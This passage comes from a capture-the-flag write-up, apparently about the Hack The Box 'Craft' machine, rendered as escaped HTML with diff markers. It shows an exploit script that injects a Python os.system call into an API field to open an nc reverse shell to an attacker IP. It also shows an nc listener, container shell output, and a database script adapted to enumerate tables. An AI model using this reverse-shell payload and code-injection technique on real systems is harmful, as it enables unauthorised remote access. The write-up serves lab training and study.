-	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'name'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pwned&quot;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'brewer'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pwned&quot;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'style'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;pwned&quot;&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'abv'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc {} {} &amp;gt;/tmp/f')&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-	&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;json&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dumps&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Starting listener on port {}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;Popen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;nc&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-lvnp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
-
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Sending payload&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-	&lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'https://api.craft.htb/api/brew/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;headers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'X-Craft-API-Token'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Content-Type'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'application/json'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;verify&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[!] Usage: {} [IP] [PORT]&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
-	&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YELLOW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Authenticating&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GREEN&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[*] Token: {}&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;exploit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;img src=&quot;/images/hackthebox/craft/15.png&quot; alt=&quot;&quot; class=&quot;align-center&quot; /&gt;&lt;br /&gt;&lt;br /&gt;
-Turns out that the application was hosted on a docker container and I didn’t get a shell on the actual host.&lt;br /&gt;&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/opt/app # cd /
-/ # ls -la
-total 64
-drwxr-xr-x    1 root     root          4096 Feb 10  2019 .
-drwxr-xr-x    1 root     root          4096 Feb 10  2019 ..
--rwxr-xr-x    1 root     root             0 Feb 10  2019 .dockerenv
-drwxr-xr-x    1 root     root          4096 Jan  3 17:20 bin
-drwxr-xr-x    5 root     root           340 Jan  3 14:58 dev
-drwxr-xr-x    1 root     root          4096 Feb 10  2019 etc
-drwxr-xr-x    2 root     root          4096 Jan 30  2019 home
-drwxr-xr-x    1 root     root          4096 Feb  6  2019 lib
-drwxr-xr-x    5 root     root          4096 Jan 30  2019 media
-drwxr-xr-x    2 root     root          4096 Jan 30  2019 mnt
-drwxr-xr-x    1 root     root          4096 Feb  9  2019 opt
-dr-xr-xr-x  238 root     root             0 Jan  3 14:58 proc
-drwx------    1 root     root          4096 Jan  3 15:16 root
-drwxr-xr-x    2 root     root          4096 Jan 30  2019 run
-drwxr-xr-x    2 root     root          4096 Jan 30  2019 sbin
-drwxr-xr-x    2 root     root          4096 Jan 30  2019 srv
-dr-xr-xr-x   13 root     root             0 Jan  3 14:58 sys
-drwxrwxrwt    1 root     root          4096 Jan  3 17:26 tmp
-drwxr-xr-x    1 root     root          4096 Feb  9  2019 usr
-drwxr-xr-x    1 root     root          4096 Jan 30  2019 var
-/ #
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;gilfoyles-gogs-credentials--ssh-key--ssh-as-gilfoyle--user-flag&quot;&gt;Gilfoyle’s Gogs Credentials –&amp;gt; SSH Key –&amp;gt; SSH as Gilfoyle –&amp;gt; User Flag&lt;/h2&gt;
-&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/app&lt;/code&gt; there was a python script called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dbtest.py&lt;/code&gt;, It connects to the database and executes a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SQL&lt;/code&gt; query:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# ls -la
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;44&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;          &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Jan&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;17&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;          &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;9&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2019&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;..&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;          &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2019&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;git&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;            &lt;span class=&quot;mi&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2019&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gitignore&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rw&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;          &lt;span class=&quot;mi&quot;&gt;1585&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2019&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;          &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2019&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;craft_api&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;           &lt;span class=&quot;mi&quot;&gt;673&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2019&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dbtest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;drwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;    &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;     &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt;          &lt;span class=&quot;mi&quot;&gt;4096&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Feb&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;2019&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tests&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# cat dbtest.py
-#!/usr/bin/env python
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pymysql&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;craft_api&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# test connection to mysql database
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pymysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_PASSWORD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_DB&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;cursorclass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pymysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursors&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DictCursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;try&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; 
-    &lt;span class=&quot;k&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;as&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SELECT `id`, `brewer`, `name`, `abv` FROM `brew` LIMIT 1&quot;&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;execute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-        &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cursor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fetchone&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-
-&lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
-    &lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;opt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;#
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;I copied the script and changed &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;result = cursor.fetchone()&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;result = cursor.fetchall()&lt;/code&gt; and I changed the query to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SHOW TABLES&lt;/code&gt;:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/env python
-&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pymysql&lt;/span&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;craft_api&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;
-
-&lt;span class=&quot;c1&quot;&gt;# test connection to mysql database
-&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;connection&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pymysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;host&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_HOST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
-                             &lt;span class=&quot;n&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;settings&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;MYSQL_DATABASE_USER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
